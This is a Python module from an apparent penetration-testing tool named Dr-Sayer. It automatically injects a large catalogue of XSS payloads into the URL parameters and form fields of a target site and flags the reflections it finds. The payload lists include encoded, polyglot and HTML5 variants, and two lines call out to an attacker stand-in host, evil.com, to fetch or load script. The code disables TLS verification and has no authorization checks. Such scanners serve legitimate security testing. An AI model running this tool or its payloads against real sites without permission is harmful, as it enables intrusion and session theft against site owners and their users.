"""
XSS Testing Module for Dr-Sayer
Author: SayerLinux (SayerLinux@outlook.sa)
Enhanced for Real Penetration Testing
"""

import requests
import re
import time
import json
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import warnings

# Suppress SSL warnings for testing
warnings.filterwarnings('ignore')

class XSSTester:
    """Advanced Cross-Site Scripting (XSS) vulnerability tester with real detection"""
    
    def __init__(self, timeout: int = 15):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.timeout = timeout
        
        # XSS payloads for different contexts - ordered by effectiveness
        self.payloads = {
            'basic': [
                '<script>alert(1)</script>',
                '<img src=x onerror="alert(1)">',
                '<svg onload="alert(1)">',
                '<body onload="alert(1)">',
                '<iframe src="javascript:alert(1)">',
                '<input onfocus="alert(1)" autofocus>',
                '<marquee onstart="alert(1)">',
                '<details open ontoggle="alert(1)">',
                '<video><source onerror="alert(1)">',
                '<audio src=x onerror="alert(1)">',
            ],
            'encoded': [
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
                '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
            ],
            'advanced': [
                '<script/src="data:text/javascript,alert(1)"></script>',
                '<img src=# onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
                '<svg/onload=alert(String.fromCharCode(88,83,83))>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
                '<img src=x onerror="fetch(\'//evil.com\')">',
                '<svg onload="alert(document.domain)">',
                '<iframe srcdoc="<script>alert(1)</script>">',
                '<form><button formaction="javascript:alert(1)">',
                '<td background="javascript:alert(1)">',
                '<div style="background:url(javascript:alert(1))">',
            ],
            'polyglot': [
                'jaVasCript:/*-/*\`/*\\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//',
                '"><svg/onload=alert(1)>',
                '\'"><svg/onload=alert(1)>',
                'javascript:alert(1)',
                '\\\";alert(1);//',
                '</script><script>alert(1)</script>',
                '<ScRiPt>alert(1)</sCrIpT>',
                '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
            ],
            'html5': [
                '<video src=x onerror="alert(1)">',
                '<audio src=x onerror="alert(1)">',
                '<details open ontoggle="alert(1)">',
                '<meter onmouseover="alert(1)" value="6">',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<iframe srcdoc="<script>alert(1)</script>">',
                '<marquee loop=1 width=0 onfinish="alert(1)">',
                '<progress onmouseover="alert(1)">',
                '<input type="image" src="x" onerror="alert(1)">',
            ]
        }
        
        
        # Detection patterns
        self.detection_patterns = [
            r'<script[^>]*>.*?alert\s*\(.*?\).*?</script>',
            r'on\w+\s*=\s*["\']?\s*alert\s*\(',
            r'javascript:\s*alert\s*\(',
            r'<iframe[^>]*src=["\']?javascript:',
            r'<svg[^>]*onload\s*=',
            r'<img[^>]*onerror\s*=',
            r'<body[^>]*onload\s*=',
            r'eval\s*\(',
            r'document\.write',
            r'innerHTML\s*='
        ]
    
    def extract_forms(self, html_content: str, base_url: str) -> List[Dict[str, Any]]:
        """Extract forms from HTML content"""
        forms = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': [],
                'textareas': [],
                'selects': []
            }
            
            # Handle relative action URLs
            if form_data['action'] and not form_data['action'].startswith('http'):
                parsed_base = urlparse(base_url)
                if form_data['action'].startswith('/'):
                    form_data['action'] = f"{parsed_base.scheme}://{parsed_base.netloc}{form_data['action']}"
                else:
                    form_data['action'] = f"{parsed_base.scheme}://{parsed_base.netloc}/{form_data['action']}"
            elif not form_data['action']:
                form_data['action'] = base_url
            
            # Extract input fields
            for input_field in form.find_all('input'):
                input_data = {
                    'name': input_field.get('name', ''),
                    'type': input_field.get('type', 'text'),
                    'value': input_field.get('value', ''),
                    'id': input_field.get('id', '')
                }
                form_data['inputs'].append(input_data)
            
            # Extract textareas
            for textarea in form.find_all('textarea'):
                textarea_data = {
                    'name': textarea.get('name', ''),
                    'id': textarea.get('id', ''),
                    'value': textarea.get('value', '')
                }
                form_data['textareas'].append(textarea_data)
            
            # Extract select fields
            for select in form.find_all('select'):
                select_data = {
                    'name': select.get('name', ''),
                    'id': select.get('id', ''),
                    'options': [option.get('value', '') for option in select.find_all('option')]
                }
                form_data['selects'].append(select_data)
            
            forms.append(form_data)
        
        return forms
    
    def test_reflection_in_response(self, response_text: str, payload: str) -> Dict[str, Any]:
        """Test if payload is reflected in the response"""
        # Check for exact payload reflection
        if payload in response_text:
            return {
                'reflected': True,
                'context': 'exact',
                'location': response_text.find(payload)
            }
        
        # Check for decoded payload reflection
        import html
        decoded_payload = html.unescape(payload)
        if decoded_payload in response_text and decoded_payload != payload:
            return {
                'reflected': True,
                'context': 'decoded',
                'location': response_text.find(decoded_payload)
            }
        
        # Check for URL-decoded reflection
        from urllib.parse import unquote
        url_decoded = unquote(payload)
        if url_decoded in response_text and url_decoded != payload:
            return {
                'reflected': True,
                'context': 'url_decoded',
                'location': response_text.find(url_decoded)
            }
        
        return {'reflected': False}
    
    def test_xss_in_parameter(self, url: str, param: str, method: str = 'GET') -> List[Dict[str, Any]]:
        """Test XSS in URL or form parameters with real detection"""
        vulnerabilities = []
        parsed_url = urlparse(url)
        found_vulnerability = False
        
        # Test different payload categories
        for category, payloads in self.payloads.items():
            if found_vulnerability:
                break
            
            for payload in payloads:
                if found_vulnerability:
                    break
                    
                try:
                    # Prepare test data
                    test_params = parse_qs(parsed_url.query) if parsed_url.query else {}
                    if param not in test_params:
                        test_params[param] = []
                    test_params[param] = [payload]
                    
                    # Make request
                    if method.upper() == 'GET':
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        if test_params:
                            test_url += f"?{urlencode(test_params, doseq=True)}"
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    else:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        response = self.session.post(test_url, data=test_params, timeout=self.timeout, verify=False)
                    
                    # Analyze response for real XSS indicators
                    reflection_result = self.test_reflection_in_response(response.text, payload)
                    
                    if reflection_result['reflected']:
                        # Check if payload is in dangerous context
                        dangerous = self._is_in_dangerous_context(response.text, payload)
                        
                        if dangerous or reflection_result['context'] == 'exact':
                            severity = 'Critical' if dangerous else 'High'
                            confidence = 'High' if dangerous else 'Medium'
                            
                            vulnerability = {
                                'type': 'Cross-Site Scripting (XSS)',
                                'subtype': category,
                                'parameter': param,
                                'payload': payload[:100],
                                'severity': severity,
                                'description': f'XSS vulnerability found in parameter: {param}',
                                'context': reflection_result['context'],
                                'evidence': self.extract_xss_evidence(response.text, payload),
                                'url': test_url,
                                'method': method,
                                'detection_method': 'Reflection',
                                'confidence': confidence,
                                'dangerous_context': dangerous,
                                'location': reflection_result.get('location', 0)
                            }
                            vulnerabilities.append(vulnerability)
                            print(f"  🚨 XSS found in {param} ({category})")
                            found_vulnerability = True
                            
                except requests.exceptions.Timeout:
                    print(f"  [-] Request timeout for {param} with {category} payload")
                except requests.exceptions.RequestException as e:
                    print(f"  [-] Request failed: {str(e)}")
                    continue
        
        return vulnerabilities
    
    def _is_in_dangerous_context(self, response_text: str, payload: str) -> bool:
        """Check if payload is in a dangerous context (not HTML-encoded)"""
        # Check for script tags
        if '<script' in response_text.lower():
            script_match = re.search(r'<script[^>]*>.*?</script>', response_text, re.IGNORECASE | re.DOTALL)
            if script_match and payload in script_match.group():
                return True
        
        # Check for event handlers
        if re.search(r'on\w+\s*=\s*["\']?' + re.escape(payload), response_text, re.IGNORECASE):
            return True
        
        # Check for javascript: protocol
        if re.search(r'href\s*=\s*["\']?javascript:', response_text, re.IGNORECASE):
            return True
        
        # Check for doc.write
        if 'document.write' in response_text and payload in response_text:
            return True
        
        # Check if payload appears unencoded in HTML
        if re.search(r'<[^>]*=' + re.escape(payload) + r'["\']?', response_text, re.IGNORECASE):
            return True
        
        return False
    
    def test_xss_in_forms(self, url: str, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test XSS in form inputs"""
        vulnerabilities = []
        
        for form in forms:
            form_action = form['action']
            form_method = form['method']
            
            # Test each input field
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'search', 'email', 'url', 'tel']:
                    param_name = input_field['name']
                    if param_name:
                        vulns = self.test_form_input(form_action, form_method, param_name)
                        vulnerabilities.extend(vulns)
            
            # Test textareas
            for textarea in form['textareas']:
                param_name = textarea['name']
                if param_name:
                    vulns = self.test_form_input(form_action, form_method, param_name)
                    vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def test_form_input(self, action_url: str, method: str, param_name: str) -> List[Dict[str, Any]]:
        """Test XSS in a specific form input"""
        vulnerabilities = []
        
        for category, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    # Prepare form data
                    form_data = {param_name: payload}
                    
                    if method.upper() == 'GET':
                        response = self.session.get(action_url, params=form_data, timeout=10)
                    else:
                        response = self.session.post(action_url, data=form_data, timeout=10)
                    
                    # Check for XSS reflection
                    reflection_result = self.test_reflection_in_response(response.text, payload)
                    
                    if reflection_result['reflected']:
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'subtype': category,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'High',
                            'description': f'XSS vulnerability found in form input: {param_name}',
                            'context': reflection_result['context'],
                            'evidence': self.extract_xss_evidence(response.text, payload),
                            'url': action_url,
                            'method': method,
                            'form_input': True
                        }
                        vulnerabilities.append(vulnerability)
                        
                except requests.exceptions.RequestException as e:
                    print(f"  [-] Form test failed: {str(e)}")
                    continue
        
        return vulnerabilities
    
    def validate_xss_execution(self, response_text: str, payload: str) -> bool:
        """Validate if XSS payload would execute"""
        # Simple validation - in practice, you'd want more sophisticated checks
        # Check if payload appears in dangerous contexts
        
        dangerous_contexts = [
            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
            r'on\w+\s*=\s*["\']?\s*' + re.escape(payload),
            r'javascript:\s*' + re.escape(payload)
        ]
        
        for pattern in dangerous_contexts:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def extract_xss_evidence(self, response_text: str, payload: str) -> str:
        """Extract XSS evidence from response"""
        # Find payload in response and extract context
        location = response_text.find(payload)
        if location != -1:
            start = max(0, location - 100)
            end = min(len(response_text), location + len(payload) + 100)
            context = response_text[start:end]
            return context.strip()
        return ""
    
    def test_target(self, target_url: str, forms: List[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Main method to test target for XSS vulnerabilities"""
        print(f"[*] Starting XSS tests on {target_url}")
        
        all_vulnerabilities = []
        
        # Get page content to extract forms if not provided
        if not forms:
            try:
                response = self.session.get(target_url, timeout=10)
                forms = self.extract_forms(response.text, target_url)
                print(f"[*] Found {len(forms)} forms on the page")
            except requests.exceptions.RequestException as e:
                print(f"  [-] Failed to fetch target page: {str(e)}")
                forms = []
        
        # Test URL parameters
        parsed_url = urlparse(target_url)
        url_params = parse_qs(parsed_url.query)
        
        for param in url_params.keys():
            print(f"[*] Testing URL parameter: {param}")
            vulns = self.test_xss_in_parameter(target_url, param)
            all_vulnerabilities.extend(vulns)
        
        # Test forms
        if forms:
            print(f"[*] Testing forms for XSS vulnerabilities")
            form_vulns = self.test_xss_in_forms(target_url, forms)
            all_vulnerabilities.extend(form_vulns)
        
        return {
            'target': target_url,
            'total_tests': len(url_params) * sum(len(payloads) for payloads in self.payloads.values()),
            'vulnerabilities': all_vulnerabilities,
            'forms_found': len(forms),
            'parameters_tested': list(url_params.keys())
        }
    
    def generate_report_data(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate formatted report data"""
        return {
            'module': 'Cross-Site Scripting (XSS)',
            'target': results['target'],
            'total_vulnerabilities': len(results['vulnerabilities']),
            'vulnerabilities': results['vulnerabilities'],
            'forms_analyzed': results['forms_found'],
            'parameters_tested': results['parameters_tested'],
            'testing_timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }